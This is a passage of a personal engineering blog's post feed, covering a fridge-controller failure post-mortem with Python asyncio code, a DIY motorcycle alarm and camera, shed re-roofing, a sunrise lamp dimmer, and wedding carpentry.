down into the heat exchange, and then fused in situ. The whole thing is now one lump and cannot be separated.\nThe sensor had indeed come detached. I stripped the broken wire, screwed it into the block, and rebooted the fridge, at which point it instantly went into deep freeze mode. The freezer was sitting at around 50 C, whilst the fridge had only got up to room temperature. The element was still hot to the touch, but I think the defrost had actually finished a while before. A chicken breast in the freezer had actually been cooked, and all the (little) food in it was ruined; but there was still ice in the bottom drawer.\nAfter a few minutes of cooling (with almost no air getting through the blocked heat exchange to cool the freezer) everything was at a normal temperature and the food in the fridge could be transferred out (it was all fine), the food in the freezer binned, the controller hardware stripped away and the fridge removed from the kitchen. Then I spent the evening cleaning up, moving things around, moping around, and wondering how I could be so very stupid.\nWe had another separate fridge and freezer, and placing them side by side where the fridge was we now have another work surface and a lot more light in the room. My wife professes to prefer it this way, and I don\u0026rsquo;t think she\u0026rsquo;s just trying to make me feel better. So all is not too bad: and it could have caught fire in the night or something horrible. What follows is an attempt to understand what did happen.\nAnalysis In order to understand how something like this could happen, it\u0026rsquo;s necessary to look at the architecture of OpenFridge. The basic coding pattern is to isolate all hardware interfaces inside HALs which respond to events (\u0026rsquo;turn on\u0026rsquo;, \u0026rsquo;turn off\u0026rsquo;, \u0026lsquo;raise temperature\u0026rsquo;) and take the appropriate actions by themselves. Thus the control loop is extremely simple, and is full of statements like this:\nif hal.sensors[\u0026#34;fridge_temp\u0026#34;] \u0026lt; settings.get(\u0026#34;fridge_setpoint\u0026#34;) - settings.get(\u0026#34;hysteresis\u0026#34;): if debugging: logger.debug(\u0026#34;Fridge under temperature\u0026#34;) hal.fridge_freezer.refridgerating = False A similar control loop runs for refrigerating, and another for defrosting. The fridge_freezer class has properties\u0026mdash;defrosting, freezing, refridgerating [sic]\u0026mdash;and setting them causes it to change state. It then works out the appropriate state for the hardware and commands that state to a the HAL it inherits from. Some states are in conflict: you cannot be at once heating and cooling. The control loop further checks that the commanded state is not in conflict, forbidding turning on heating and cooling at once, or turning the compressor on if it has been turned off in the last 5 minutes (thus giving the gas time to reliquify, preventing undue load when starting the motor). These double checks exist because the hardware can be directly controlled by the API for testing purposes, and we still want safeguards.\nOpenFridge uses a crude way of getting these synchronous properties into an asychronous control loop:\nclass FridgeFreezer(HAL): ... @property def freezing(self): return self._freezing @freezing.setter def freezing(self, val): if val and self.defrosting: raise FridgeError(\u0026#34;Not allowed to freeze when defrosting\u0026#34;) self._freezing = val if not val: self.set_state(\u0026#34;fan\u0026#34;, False) if not self._refridgerating: self.set_state(\u0026#34;compressor\u0026#34;, False) self.set_state(\u0026#34;deep_freeze\u0026#34;, False) else: self.set_state(\u0026#34;fan\u0026#34;, True) self.set_state(\u0026#34;compressor\u0026#34;, True) def set_state(self, name, val): self._state[name] = True if val else False I\u0026rsquo;ve simplified a bit: set_state belongs on the underlying HAL, whereas freezing is a property of the derived FridgeFreezer. Then in the hardware_control_loop, ignoring all the code for mocked control and conflict checking, we have:\nasync def hardware_control_loop(self): while True: self._wdt.feed() for name, val in self._state.items(): if self.achieved_state(name): continue elif safe_to_achieve_state(name): # dummy await self._set_output(name, val) await asyncio.sleep(1) This introduces a latency of at least 1 second between setting an output and the hardware responding, but that doesn\u0026rsquo;t matter here. The wdt is fed from this loop, as I was mostly interested in keeping this loop alive\u0026mdash;after all, if it\u0026rsquo;s running, we can\u0026rsquo;t get into any horrible state, can we? Oops. Having an .achieved_state method is no bad thing, as we can use it in debugging. But all this could be much better written using an awaitable event with message, which is what I now do:\nasync def _loop(self): while True: msg = await self._update.wait() if msg is self.HEATING_ON: self.relay.on() ... For this idiom we would need either to re-set the message, or use an queue and only pop the task when we actually apply it. But the advantage is near-instantaneous transition from the synchronous property to the hardware doing what you want, despite having to wait for the event loop to call your code.\nSensor reading code Here is the sensor reading code:\nasync def get_temps() sensors = { \u0026#34;freezer_temp\u0026#34;: None, \u0026#34;fridge_temp\u0026#34;: None, \u0026#34;ext_temp\u0026#34;: None, \u0026#34;cooler_temp\u0026#34;: None, } for _ in range(5): sens.convert_temp() await asyncio.sleep(1) for sensor in sensors: if sensors[sensor]: continue rom = getattr(config, sensor.replace(\u0026#34;temp\u0026#34;, \u0026#34;rom\u0026#34;)) temp = sens.read_temp(rom) if temp != 85: sensors[sensor] = temp if all(x for _, x in sensors.items()): break await asyncio.sleep_ms(100) return sensors This code is rather odd, so it needs some explanation. sens is a sensor object, which communicates with the DS18X20 clones I\u0026rsquo;m using. Sometimes those sensors can fail to read, in which case they return 85. It is possible to distinguish this false 85 C from a true reading of 85 C, but since the fridge was not supposed to get up to 85 C in the first place I simply checked it directly. What we do is:\nTrigger all the sensors to measure temperature Wait for them to do it Get the right rom code and address the bus to query the result for that sensor If the reading is 85, ignore it, else assign it If all sensors have been read successfully, return them, else keep trying for a maximum of 5 attempts. Incidentally, this is not the best style in the world: all(sensors.values()) would have been better than all(x for _, x in sensors.items()), although all(1 for _, x in sensors.items()) would still have been better than what I wrote; and for sensor in (x for x in sensors if not sensors[x]) might well have been more readable than continuing immediately. But the code as written worked fine for more than a year. The trouble is in the line:\ntemp = sens.read_temp(rom) Detach the sensor and this raises an error, rather than returning 85. At that point, following the logic of this function, we should return None, so that comparisons will fail higher up the call stack. Instead we will raise an uncaught error and die. Worse, here is the calling code:\nasync def temp_loop(): global sensors while True: while not mock_temps: sensors = await get_temps() await asyncio.sleep(5) mocking_temps.set() while mock_temps: await asyncio.sleep(1) Ignore the bit about mocking: that was used by the functional test routines to simulate different conditions. The event is used to signal to the test function that we have entered mocking mode, as depending on the load it can take a while to get back to the loop, and of course the loop has a 5s delay.\nIf get_temps() raises here, it will propagate back up this loop, which, without an exception handler, will die. Now the rest of the event loop will continue on its merry way with the (stale) values, and the stage is set for the denouement.\nI thought of this problem a long time ago, and I now use a much more robust temperature loop which captures exceptions originating at the hardware level, but I was holding off touching the OpenFridge code until I\u0026rsquo;d finished writing and testing some unrelated HTTP authentication code for the API.\nDefrosting Code Here is the defrosting code. It contains only one error:\nasync def _defrost(): for i in range(60): try: hal.fridge_freezer.defrosting = True break except FridgeError: await asyncio.sleep(10) if not hal.fridge_freezer.defrosting: logger.info(\u0026#34;Failed to start defrosting: timed out waiting\u0026#34;) return while not hal.fridge_freezer.achieved_state(\u0026#34;heaters\u0026#34;): await asyncio.sleep(10) # defrost till element reaches 10C or 120 minutes is up for i in range(60 * 12): if hal.sensors[\u0026#34;cooler_temp\u0026#34;] \u0026gt;= 2: break await asyncio.sleep(10) await asyncio.sleep(60 * 5) # reduce thermal stress hal.fridge_freezer.defrosting = False Here we try to start defrosting for a maximum of 600s, and give up if we can\u0026rsquo;t. If we can, we defrost \u0026lsquo;until the element reaches 10C or 120 minutes is up\u0026rsquo;. The error is that number: 120 minutes is far too long a defrost cycle. It was initially half an hour, but I increased it when trying to work out why the freezer was icing up whilst the thermal fuse was blown and thus the heater wasn\u0026rsquo;t coming on at all. The gentle heating I thought I was seeing was actually just loss to the environment. I noticed this as soon as I removed the blown fuse, but forgot to go and change that constant for a smaller number. Had it been only 30 minutes, the Freezer would be absolutely fine. Had it been 60 minutes, the freezer would likely be mostly intact. In point of fact two hours of defrosting\u0026mdash;over by time we got to the freezer\u0026mdash;cooked a chicken breast very nicely!\nFalse Assumptions When I knocked the wire I immediately thought of the risk, but I didn\u0026rsquo;t worry about it since I assumed a dead sensor would cause an error to propagate, rebooting the fridge, at which point failure would be obvious. It would be stuck in a reboot cycle (with all the hardware off), would fail to light up when opened, and I could fix the problem and carry on. Nothing could get over-temperature, because I hadn\u0026rsquo;t damaged the all-important cooler sensor. This assumption was wrong in several ways:\nI had not in fact implemented the stale reading timeout I since use as standard in all my code, so it happily believed the old readings were true.\nWhilst the other three sensors functioned perfectly correctly, the code was brittle: it couldn\u0026rsquo;t cope with even a single failure.\nThere was in fact no guarantee that throwing an exception would terminate the program. This is something to bear in mind in asyncio code: we are so used to the synchronous assumption that throwing an uncaught exception terminates everything we rarely think about writing error handlers for unrecoverable cases. Throwing an exception in asyncio code does not terminate the loop by default.\nThis latter point is counter-intuitive. Consider the following code:\n# /tmp/test.py import asyncio async def errorfn(): raise Exception(\u0026#34;Error\u0026#34;) async def otherfn(): await asyncio.sleep(1) print(\u0026#34;I\u0026#39;m running\u0026#34;) loop = asyncio.get_event_loop() loop.create_task(errorfn()) loop.create_task(otherfn()) loop.run_forever() What happens if you run this? The answer is this:\nTask exception was never retrieved future: \u0026lt;Task finished name=\u0026#39;Task-1\u0026#39; coro=\u0026lt;errorfn() done, defined at /tmp/test.py:4\u0026gt; exception=Exception(\u0026#39;Error\u0026#39;)\u0026gt; Traceback (most recent call last): File \u0026#34;/tmp/test.py\u0026#34;, line 5, in errorfn raise Exception(\u0026#34;Error\u0026#34;) Exception: Error I\u0026#39;m running The worst thing is that I was well aware of this, and part of the work due to be done on OpenFridge was to add a general bail-out-now function which signalled that our current state really wasn\u0026rsquo;t good enough. Of course, this should be checked in the watchdog, but I was only using the watchdog to detect if the loop was running at all\u0026mdash;because sometimes the whole processor would lock up for (I suspect) EMI related reasons.\nMorals OpenFridge controlled an otherwise dead fridge-freezer correctly for over a year. I bought this fridge-freezer for £90 around three years ago: since then:\nthe power failed with a full load of food and I had to clean it out the controller failed and was replaced with a breadboarded controller the defrosting failed with that controller after it got into a conflicted state (heating and cooling at once) and it was extensively re-written to avoid conflicts. (This worked very well and is the basis for all embedded code I\u0026rsquo;ve written since.) We got another year out of a junk fridge; I got a lot of experience writing asyncio code in python, and a stable architecture for embedded systems with asyncio; and now we\u0026rsquo;ve got a lot more space in the kitchen, and a fair bit more light.\nStill, I\u0026rsquo;m sad to see it go: a lot of work went into that fridge. Particularly for a completely avoidable bug I had actually predicted but hadn\u0026rsquo;t got round to fixing.\nSome takeaways:\nAlways pick safe fallback defaults. 120 minutes\u0026rsquo; defrosting was a stupid value. Look hard at failure points in asynchronous code. You need to handle errors early, yourself. Replace brittle code as soon as you notice the assumptions. Don\u0026rsquo;t leave state lying around if the code updating it has died. Replace your hardware interlocks pronto. It was alright to run the fridge without the fuse for a few days to stop the food going off. It wasn\u0026rsquo;t alright to run it that way for a few months. The lesson is very simple: always have a hardware interlock. A £0.60 thermal fuse would have saved the whole system, and OpenFridge would still be running today.\n","permalink":"https://2e0byo.github.io/post/engineering/reverse-engineering-fridge4/","tags":null,"title":"ClosedFridge: RIP OpenFridge"},{"categories":["Carpentry","Engineering"],"contents":"Exactly how flat does a sharpening stone need to be? Exactly how flat, for that matter, does a plane need to be?\nI\u0026rsquo;m on holiday. Here is a toy plane, a soft building block, and a half brick (not cut by me):\nThe plane started out rather rusty, as did the iron (why do I always forget to take \u0026lsquo;before\u0026rsquo; photos?). The plane sole, lubricated with water, was used to flatten off the soft building block, and it was then used to take the rust off the iron. The half-brick did a much better job of sharpening, but it wasn\u0026rsquo;t perfect. Then I found a better stone:\nSame drill\u0026mdash;flatten with the plane sole, then sharpen. It wasn\u0026rsquo;t the best edge I\u0026rsquo;ve ever made, but it was pretty sharp. The plane is rather all over the place, but it made rounding off the table edges easy:\nNot so great across the grain, but that\u0026#39;s mostly the frog being too large.\nPressed from a single sheet of steel!\n","permalink":"https://2e0byo.github.io/post/carpentry/plane-repair/","tags":null,"title":"Plane Repair"},{"categories":["Electronics"],"contents":"Apparently one of the local bike thieves was eyeing up the bike. Certainly a car was driving down the road, crawling opposite the bike, and then driving off again. Having had one bike nicked I didn\u0026rsquo;t much fancy losing another. Thus we had to make the house look a lot more secure in a hurry; and the shops were closing that evening and not reopening till Tuesday. For it was the New Year.\nCCTV External CCTV cameras are still not exactly cheap. But internal \u0026lsquo;cctv/baby monitor\u0026rsquo; cameras are now as little as £25\u0026mdash;that with wifi. And ARGOS is open late\u0026hellip;\nThus a cheapo camera was obtained and stuck inside by a window. I had to disable the IR leds, and the \u0026lsquo;motion detector\u0026rsquo; caused a flashing alarm which blinded the camera by illuminating the window, but it worked. I left it like that for a few days while waiting for Screwfix to reopen.\nThen I cut a perspex window from some scrap and glued it inside a large weatherproof box:\nThen the camera was placed inside and an LED floodlight wired in via a grommet, all screwed to a wooden board:\nI will not include details of how I wired it, but there was a grille directly below and I steal some current from the lighting main without having to make any holes in anything. Which is as well, as this was an emergency and I hadn\u0026rsquo;t asked the landlord.\nSince I have no intention of leaving the camera connected to the proprietary network it came set up on, I set up a basic script rotating 1h files on the main computer. If I ever build a file server it can move over there. At some point we\u0026rsquo;ll see if the camera isn\u0026rsquo;t vulnerable to a hardware attack. If it still has a serial port life should be very easy; I\u0026rsquo;m pretty certain it\u0026rsquo;s running linux.\nMotorcycle alarm How do you alarm a motorcycle? I wasn\u0026rsquo;t content with just making a loud noise: does anyone really pay any attention to loud noises from alarms? We all assume it\u0026rsquo;s a mistake and ignore it. On the other hand, the bike is heavy (at least 300kg) and it is unlikely it could be moved without rolling. So a wire through the front wheel would have to be cut.\nHere, then, is a basic alarm:\nAn ESP8266 running micropython monitors the state of a pin pulled low via he cable. Cut the cable and it will go high and trigger an alarm state. In ordinary operation the device sends an MQTT packet every n seconds. If k packets are not received, an alarm sounds inside the house. (Originally this code ran on a laptop; later it was added into the towel heater controller running in our bedroom.) The alarm has an \u0026lsquo;arm\u0026rsquo; button which gives you around a minute to install before triggering if the wire isn\u0026rsquo;t there.\nHere is the system installed in a waterproof box protecting the bike:\nThe snow gives some idea of the kind of problems we encountered:\nUsing the onboard linear regulator, battery life is less than a day. (I logged discharge curves and the effect of temperature was evident). Wifi is quite battery consuming. But if you put the chipset to sleep it doesn\u0026rsquo;t always reconnect, so you have to increase k to handle missed packets, decreasing responsiveness. The ESP8266 has a deep sleep mode, but it involves rebooting the whole SoC. But the onboard code takes around a minute to come online, since at the moment I use Peter Hinch\u0026rsquo;s resilient Async MQTT driver. So the code should be rewritten with boot-sleep-reboot in mind. In practice, it was used in this form for a few weeks, recharging batteries every day. Then the box was left with dead batteries for a bit, and then I got fed up with it and it went back inside the house. But with some redesign\u0026mdash;the best would be for cutting the cable to trigger a power up, so the device could remain powered down for increments more like 20m, coming online only to report its battery status and then going down again\u0026mdash;it could have the kind of battery life needed to be useful when we\u0026rsquo;re on holiday. For now, we\u0026rsquo;ve got the camera\u0026mdash;and who really wants to nick a \u0026gt;10 year old Pan?\nPostscript All alarms are defeatable. This one is quite easy to defeat: the thief just needs to bridge the wire (I used some Cat5 cable just to make it harder to guess what needed bridging). If the box is opened it would be quite easy to see how to do it (although I could easily add a spring-loaded \u0026lsquo;box open\u0026rsquo; alarm). But it adds one more layer of nuisance to send someone elsewhere. When I have finished restoring the previous stolen bike I mean to build something much more reliable of the same kind, to give me some certainty that the bike really is there.\n","permalink":"https://2e0byo.github.io/post/electronics/motorcycle-alarm/","tags":null,"title":"Motorcycle Alarm"},{"categories":["Building"],"contents":"We have a brick built shed with a concrete roof, which serves me as workshop. Unfortunately when we moved in the torched on felt (the proper three-layer system) had died in a large part, and water could make its way inside. Thus it needed re-roofing.\nNow, whilst I have no experience roofing beyond tacking down felt on wooden roofs (which is infinitely simpler than what ended up happening), I immediately decided to volunteer to re-roof it if the landlord would pay. And since it made no sense to do one side, I offered to do the neighbour\u0026rsquo;s half as well (the shed is semi-detached). The reasoning at the time was that a proper reroofing job would be at least a grand, and the landlord was unlikely to volunteer that for a small leak. More likely he would put some sealer on; the problem would reappear; etc. (I have no evidence this would actually be the case as I did not ask him. But it\u0026rsquo;s what I\u0026rsquo;d likely do if someone said the shed was leaking\u0026mdash;repair it for a year or so and try to get friendly with a roofer in the meanwhile.) Whereas I wanted to know the tools and wood inside were properly dry. And besides, I\u0026rsquo;d never done anything of the kind.\nThe options, then, were:\nseal with some (GRP?) roof sealant and hope for the best hire/buy roofing torch, roller, etc and do a 3-layer system as before strip the roof and replace with a modern GRP roof-in-a-can strip the roof and put down shed felt strip the roof, seal it with bitumen sealer, apply a thick bitumen paint layer, and then felt as a top layer Whilst the modern GRP roofing processes are supposed to last for ever and be completely leak free, where do you go if they go wrong? You can\u0026rsquo;t exactly buy the stuff at B\u0026amp;Q. Torching was out\u0026mdash;I\u0026rsquo;ve seen a roof burned out in a reroofing job, and I\u0026rsquo;ve no desire to try to explain that to the landlord. Just slapping down shed felt feels horrible when the current finish has lasted so long. So I went with the latter option.\nFirstly, I needed a ladder. They were all rather expensive, so this was knocked together:\nThen Lidl had a decent ladder on offer, so I carried one home. Two ladders doesn\u0026rsquo;t do any harm, after all.\nThe bitumen sealer is a thin paint, more like wood stain. It waterproofs the concrete largely so the next layer will take without soaking in, but it does provide a degree of sealing in the cracks.\nThe bitumen paint, on the other hand, is a thick, viscous layer applied \u0026lsquo;with brush or mop\u0026rsquo;. It forms a layer all in itself, about 3/8\u0026quot; to 1/2\u0026quot; thick. When tacky the felt is placed on top (and rolled down with another roll of felt, since I lacked a roller). The felt was the thickest, longest life no-torch felt I could find, specced for 15 years. Since even a torched roof is only supposed to last 20 years without work, and frequently lasts no longer than 15, I didn\u0026rsquo;t feel too bad about that.\nThis bitumen paint is horrible stuff. The professionals use it if torching isn\u0026rsquo;t possible. It comes in horrible big drums, and after half an hour the solvent had sent me completely light-headed (hold on when using ladders).\nThis photo is safe to have on the internet until they develop painting-gait analysis software.\nBut worse even than that was clearing off the old felt. Most of it came fine, but a portion\u0026mdash;about 1/3 of the roof\u0026mdash;was still stuck down (i.e. 2/3 was flapping loose). Roofers have a proper tool for scraping off old felt\u0026mdash;and of course can apply heat. I had a handheld paint scraper. It took several hours and left my right arm and wrist very sore. But once you\u0026rsquo;ve started a job like this you have to finish.\nThen the felt was folded round and glued down, but I was running out of bitumen paint, and the wind was fighting me. I cut it in a hurry with scissors\u0026mdash;none too straight\u0026mdash;and cleared up the worst of the bitumen run off. Then later I fitted a fascia board, guttering and a downpipe.\nPostmortem All in all there were around 20 heavy-duty black sacks of rubbish when I\u0026rsquo;d finished, not including all the clothes I\u0026rsquo;d worn, the brushes, gloves and paint drums. The ladders were cleaned up a bit with white spirit; then the wooden was just painted over and the metal eventually cleaned with tar remover the neighbour gave me. A few things would have made life easier:\nClamping the side of the felt whilst it glues needs attention before starting work (I ended up making up jigs whilst it dripped). Better is to fold round and glue underneath, even if it does mean losing the (cast) drip rail. That way you can just use G-clamps. Just because the torched on stuff hung straight down doesn\u0026rsquo;t mean yours has to (you can just crease it to make an overhang). Don\u0026rsquo;t do anything with bitumen paint, ever. It is pretty good though Guttering covers a multitude of sins. So does screwing a rain guide board on to the edge. But that would require making fixing holes first. Bitumen will never, ever, come out of anything it touches. Fortunately the landlord doesn\u0026rsquo;t seem to care about the odd streamers which made it onto the fence. I got the worst off. ","permalink":"https://2e0byo.github.io/post/building/shed-roof/","tags":null,"title":"Reroofing a concrete shed"},{"categories":["Engineering"],"contents":"What do you do with a broken zipper? Especially early in the morning (i.e. around 1am).\nHere is one way to repair a zip, preserving the latching effect to stop it falling down by itself. The wire rope (from ordinary copper stranded hookup wire) pulls the latching tooth, and the fairlead (made from two very small screws and some more wire soldered in place) converts enough of the tension into downwards force to move the zip. I have no idea how it has held up in practice, as the coat is my mother\u0026rsquo;s.\n","permalink":"https://2e0byo.github.io/post/engineering/zip/","tags":["Lockdown"],"title":"Overzealous Zip Repair"},{"categories":["Electronics","clocks"],"contents":"Every project is a prototype, which calls out for a second version avoiding the mistakes of the former. The trick is to give the prototypes away; then one has a legitimate excuse to make another\u0026mdash;and one gains an (undeserved) reputation for generosity to boot. After the quick sunrise alarm clock various things happened, including a \u0026rsquo;two week lockdown\u0026rsquo; to build up capacity in the NHS, which turned into three months. Thus I was stuck in one part of London, and my fiancée in another, and the streets were patrolled by Dobermans with £10,000 fine notices stuck to their teeth. How to get from one side of London to the other?\nFortunately in the Lockdowns we learnt that the menial classes (i.e. pizza-delivery men, bus-drivers, cleaners, plumbers, gardeners, bin-men, the people who stick those flyers through the letterbox which nobody reads, etc) were immune to the plague and thus could be allowed to bring us pizza, clean our houses, take out our bins full of \u0026rsquo;essential\u0026rsquo; Amazon supplies, etc, without catching the plague and dying by their thousands.1 Meanwhile we, the at-risk young, the dangerously unfit middle classes whose gymns had been closed (et cetera, et cetera) could protect ourselves by staying at home and ordering takeaway pizza and new toys from Amazon. And in this way we all battled mightily against the plague, \u0026lsquo;The rich man in his castle/The poor man at his gate\u0026rsquo;.\nThus clearly the trick for getting across London as a detested member of the bourgeoisie2 was to dress up as the proletariat. There is in any case a long tradition of this kind of thing\u0026mdash;Lawrence of Arabia, General Gordon, Richard the Lionheart encouraging his troops at the battle of Stamford Bridge (or was it Harper\u0026rsquo;s Ferry?), etc. Whenever in a truly egalitarian society one needs to do anything important one immediately dresses up as an Amazon deliveryman. Anyhow, it was as good a disguise as any for getting across London: nobody even sees people who ride motorbikes or walk about in motorcycle gear carrying an Amazon parcel (even if closer examination would reveal several Amazon boxes taped together). Thus the obvious means of re-enacting the famous spectacles advert (copyright Will Shakespeare) was to carry a bouquet of Amazon parcels, or at least one. But what to put in it?\nElectronics Everyone needs a bedside lamp! Besides, my fiancée had been known to have difficulty waking up and falling asleep (a not unencounterable problem in a world of perennial light pollution, mobile phones and early-rising hammer-drill operators). And anyhow, I needed an excuse to make another. I started as before:\nThis time it\u0026rsquo;s a bigger bulb, with a full flyback psu. This complicated PWM feedback: I can\u0026rsquo;t remember quite how but it was possible to get a degree of fading, but hardly down to nothing:\nAt this point I very thoroughly blew the whole thing up. I do not quite recall how\u0026mdash;and it was rather late at night\u0026mdash;but I suspect I forgot the PSU had no isolation in it and connected an oscilloscope probe ground to something I shouldn\u0026rsquo;t have. I had been intending to try PWM with a mosfet shorting the output (which works by triggering the PSU\u0026rsquo;s overcurrent protection to shut it down). But that felt like a pretty horrible hack, so it\u0026rsquo;s perhaps as well I didn\u0026rsquo;t end up using it.\nThe obvious approach was to do a proper mosfet trailing-edge dimmer and fit a standard lamp socket. But I did not have any paired power mosfets, so I tried a single-mosfet + bridge rectifier solution (the circuit can be found floating all over the internet):\nThe trouble with this is that one depends upon a large capacitor to supply the mosfet gate voltage, whilst simultaneously shorting out the capacitor. Thus the maximum duty cycle is something like 90%, and the mosfet gets warm from the poor turn off. Thus I moved on to the next version available all over the internet\u0026mdash;rectify the mains and chop the resulting dc directly with the mosfet, using a smoothed HV + resistor + optoisolator to feed the base. For faster turn on/off we can invert things and have the optoisolator pull the gate down (since continuous gate current is very low) via a PNP transistor. I followed the internet in putting the capacitors on the HV side to avoid having to think about charging constants, but the only capacitors available were rated at 200v, so two were used in series. (I think these capacitors came from an old set top box.)\nBy this point I\u0026rsquo;d worked out the overall style, and the lamp fitting had arrived. Here it is mounted on some laminate for heat insulation reasons:\nand a test with this junkbox DC fader could be done:\nThe hardware is the same as before\u0026mdash;a PIC18F2550, HD44780 compatible 16x2 lcd, some buttons, etc, and a 5v psu pulled from some charger or other. The code is a horrible mess. It\u0026rsquo;s online at 2e0byo/sunrise_clock. It began life as a Pinguino project, but I quickly got fed up with working in a half-baked IDE. Pinguino is fake c++ which transpiles to C and then compiles with the standard (albeit not very standards-compliant) Microchip toolchain. So I pulled the transpiled files from the build dir and started hacking them directly. After a lot of messing around I had a minimal user.c + libraries which, together with a main.c which is mostly #ifdefs and enough definitions, produced binaries which did the right thing. The development from then on is a horrible mix of high-level convenience functions and direct port setting. A testsuite would be nice, but it\u0026rsquo;s too much of a mess to be worth it. However, the code now provides:\nA multi-level menu with entry functions (and a menu loop handling debouncing, timing out, etc) Sunrise alarm with optional (fading on) ringing Snoozing Sunset Adjustable lamp Soft actions (all brightness changes are fades) to protect eyes Adjustable min/max thresholds Persistence (EEPROM) of parameters Time display in all modes without visible flickering Display writing without flickering, despite doing it backwards (display updates in main loop) A basic HAL to allow adapting to multiple different hardware configurations It would have been much more sensible to have started with the display code and build from there, but this code has been running on 3 different devices (it was backported to the original hardware) for more than a year now, and I think all the bugs have since been ironed out.\nCase The lampshade has a frame from old bicycle spokes:\nWhich bend neatly and remain straight:\nAnd were then soldered together with the gas iron (a nasty fiddly process of which there are no photos) and covered in paper.\nThe case is a basic clear perspex box. I ordered the plastic pre-cut:\ndrilled, cut and draw-filed it:\nflame polished:\nAnd glued the whole thing up (meanwhile the lamp shade was undergoing heat testing to make sure it didn\u0026rsquo;t catch fire):\nAnd then installed everything. Sadly I overtightened one of the support rods and started a crack. It\u0026rsquo;s pretty tiny in these pictures, but it has grown with time (of course) and I should really replace the top piece.\nAll together it looked very good:\nMains Tick At this point the clock used the same software RTC as before. The drift was tolerable but annoying. A much better idea would be to take the tick from the mains: long-term mains frequency stability is excellent (better certainly than uncalibrated 32.768kHz crystals with no sort of temperature compensation). Thus later I added a pair of back-to-back optoisolators as a TTL switch, fed via 5 series 10K resistors to supply the specified switching current. (In point of fact these resistors get rather hot, and one could likely get away with a much lower current. But I have a lot of 10K resistors.)\nThis is at 100Hz!\nIn use it squeezes on one side of the HV side of the base of the lamp.\nSince installation the clock has been rock-solid: only the ntp controlled devices in the house are better. The only trouble is that, now we are married, the lamp wakes my wife up a good deal before it wakes me up (naturally, it is on her side of the bed). Thus I should really make another clock. Although in that case they should synchronise brightness, and that would really require rewriting the code for a better SoC with integrated bluetooth\u0026hellip;.\nUnless they were tested before being run over, of course.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nThis being French for \u0026rsquo;everyone who went to university\u0026rsquo;, i.e. about 80% of the country.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","permalink":"https://2e0byo.github.io/post/electronics/clocks/sunrise-lamp/","tags":["Lockdown","clocks","lamps"],"title":"Sunrise Lamp"},{"categories":["Carpentry"],"contents":"Due to measures to combat the epidemic of bigamous marriages or something of the kind, we ended up having a wedding reception in the garden. Thus we needed tables, and benches, and things of the kind. Time to put the workbench to work.\nFirstly there was a lorry:\nThen there was a lot of wood:\nThe short pieces are legs for the benches; the longer will become benches and trestles (and will replace these horrible trestles I made earlier). But the OSB was even more of a nuisance, so that got sliced up first.\nPlanters The OSB was cut with the plunge saw:\nThe first of which I treated with PVA to waterproof it:\nEach sheet of 1/2\u0026quot; OSB yields three planters (if I recall correctly), and the first set were all waterproofed. Dad made the rest and Mum painted them and then lined them with builder\u0026rsquo;s plastic:\nA wooden chalet wall One great sheet of 3/4\u0026quot; osb was clad in pine cladding and then oiled:\nThis stands on two feet on the worksurface in the kitchen and has pans hung on it. It was a wedding present, so it made sense to do it first. But in fact, I over applied the oil that evening, left it overnight, and had partially dried oil to remove the next morning with a stiff cloth. Notes for applying drying oils (like boiled linseed):\nyou can over apply. don\u0026rsquo;t use wire wool unless the surface is glassy. Yes you get a lovely finish\u0026mdash;but the wire wool will catch and stick to every tiny imperfection in the grain. apply many small coats rather than one big. In other words, it\u0026rsquo;s much more like paint. On the other hand, with raw linseed I soak and even heat it to get it right into the wood.\nTables The trestles had to be planed flat top and bottom of the long end of the I-beam and flat and square all round for the horizontal pieces. Twist was taken out in the long piece, but the faces were not made parallel. Gluing up was done by eye with one end of the I-beam, and then using the bench top to register the other. The result by the evening was a pile of trestles:\nAfter which the legs could be cut to length:\nAnd screwed in place with the trestles held in the vice:\nthen wedged up flat on a sheet of ply and scribed flat:\nHere they all are:\nThe table tops are merely 18mm exterior ply, 8\u0026rsquo; in length with 18\u0026quot; cut off one side with the plunge saw, and CLS screwed along to prevent bending. The edges were pared off with the block plane.\nIf one has six trestles...\nBenches The benches were from the same rough sawn timber. The legs were planed smooth (rather than flat) and rounded all round, with a notch in the middle. Originally I planned to use this as a bracket, but my cutting was not precise enough\u0026mdash;given that three tables needed six benches or twelve feet, it was all done rather fast. One understands why traditional woodworking does not use butt joints if possible: a degree of error is invisible in a cut like this but immediately ruins the joint. And I was not planing 24 faces just for a little bit more security. So the joining face was flattened and squared with the plane, and the feet end was done by eye. Here they are with edge marks:\nThen the benches themselves had to be prepared. The undersurface was planed only in the region of the joints, which were aligned with winding sticks (I could probably do with some longer winding sticks, and I think these have since disappeared):\nThen the top face and both sides were straightened, flattened and rounded fairly heavily with the planes:\nand the legs glued and screwed in place. Here they all are:\nAnd the garden almost ready:\nThen it was just coats of oil (thinned with turpentine substitute to ensure it dried in time) on all the benches, shelves up on the fence for the buffet, coated with yacht varnish and with another CLS along the length to prevent bowing (which Dad picked up in one of the many runs to B\u0026amp;Q).\nWhat is not included here is all the work planting, clearing, weeding, painting, oiling, fetching and carrying, and generally turning what had looked like an overgrown building site into somewhere we could welcome guests, all of which was done by Mum, Dad and my sister whilst I was generating plane shavings. Not to mention cutting down piles of vegetation and digging out the soil which had covered the rear paving, which my wife did a month or so before when we thought we might just have to use the garden, or the cooking and decorating and everything else which my in-laws did on the day before and even the morning of the wedding itself.\nHere is a photo chosen purely to show the furniture in use:\nAs for the others\u0026hellip; well, I shall not bore you with wedding photographs here, except for this one, which showcases nothing made by human hands at all:\nPost-scriptum: Working by hand Doing this kind of thing in a hurry has the salutary effect of curing bad habits. They become painful after about half an hour. Thus:\nget low and use your weight. Bend from the knees, not the back. a low bench is a very good thing (this bench is nice and low) sharpen tools the moment they need it. Once or twice I let the plane get a tad too blunt. Sharp it just slices through softwood: on a deep cut the wood purrs as it folds into the waste; shallow pairing lifts an even wafer all over. Slightly blunt and you are fighting the tool and the workpiece, and it wanders everywhere with the grain. economise on tool changes: all the coarse planing, then the fine, etc. a sharp chisel covers a multitude of sins. ","permalink":"https://2e0byo.github.io/post/carpentry/wedding/","tags":["Lockdown"],"title":"Wedding Carpentry"},{"categories":["Carpentry"],"contents":"The first shot at a workbench sat dormant for a fair while. Meanwhile it got cold\u0026mdash;very very cold. Then it got wet\u0026mdash;very very wet. Then it got hot\u0026mdash;very very hot. And how did my nice, carefully chosen unwarped 1\u0026quot; planks look after that? A pretty sorry state. Even the laminated legs had moved slightly (next time for lamination I need more glue). Then I discovered that I could get 6x2s from MKM building supplies. I rang to ask about stock and he 